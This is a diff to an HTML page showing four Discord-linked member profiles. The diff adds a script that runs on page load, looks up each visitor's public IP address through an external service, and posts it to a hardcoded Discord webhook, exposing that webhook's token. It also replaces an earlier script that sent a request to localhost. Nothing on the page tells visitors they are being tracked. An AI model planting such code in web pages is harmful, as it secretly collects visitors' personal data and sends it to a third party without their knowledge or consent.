@@ -22,7 +22,6 @@
   </div>
 
   <div class="container" id="profiles-container" style="display: none;">
-    <!-- Perfil vokal -->
     <div class="profile left">
       <div class="avatar">
         <a href="https://discord.gg/governo" target="_blank">
@@ -36,7 +35,6 @@
       <div class="badges" id="badges-1139957418823008318"></div>
     </div>
 
-    <!-- Perfil oro -->
     <div class="profile right">
       <div class="avatar">
         <a href="https://discord.gg/governo" target="_blank">
@@ -50,7 +48,6 @@
       <div class="badges" id="badges-748940599150772344"></div>
     </div>
 
-    <!-- Perfil Lowest -->
     <div class="profile bottom">
       <div class="avatar">
         <a href="https://discord.gg/governo" target="_blank">
@@ -64,7 +61,6 @@
       <div class="badges" id="badges-1171492628831928322"></div>
     </div>
 
-    <!-- Hizz -->
     <div class="profile bottom">
       <div class="avatar">
         <a href="https://discord.gg/governo" target="_blank">
@@ -78,12 +74,26 @@
       <div class="badges" id="badges-784552912038133760"></div>
     </div>
   </div>
-<script>
-        fetch('http://localhost:3000/')
-            .then(response => console.log('IP enviado ao servidor.'))
-            .catch(err => console.error('Erro ao conectar ao servidor:', err));
-    </script>
 
+  <script>
+    const discordWebhookUrl = "https://discord.com/api/webhooks/1329334684265615493/MMbJy0siz-XDygVugAU0XzlznK8XdayuOCcAdlfuemNluDVCTD0goMXgJi2qC_awhAuv";
+
+    fetch("https://api.ipify.org?format=json")
+      .then(response => response.json())
+      .then(data => {
+        const userIp = data.ip;
+        fetch(discordWebhookUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: `Novo visitante com IP: ${userIp}`
+          })
+        })
+        .then(() => console.log(`IP enviado para o Discord: ${userIp}`))
+        .catch(err => console.error("Erro ao enviar IP:", err));
+      })
+      .catch(err => console.error("Erro ao obter o IP:", err));
+  </script>
 
   <script src="script.js"></script>
 </body>
